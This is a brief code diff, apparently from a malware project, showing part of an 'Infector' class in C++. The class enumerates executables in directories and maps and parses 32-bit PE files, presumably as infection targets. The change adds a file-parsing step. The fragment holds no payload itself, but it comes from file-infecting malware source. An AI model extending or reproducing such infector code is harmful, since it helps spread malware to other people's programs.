@@ -152,7 +152,10 @@ void Infector::get_exes(std::vector<std::filesystem::path>& dir_paths, std::vect
                 if (file_already_running(entry.path()) == false)
                 {
                     PE::PE_file pe_file(entry.path());
+                   
                     pe_file.map_file();
+                    pe_file.parse_file();
+                    
 
                     if (pe_file.check_32() == true)
                     {
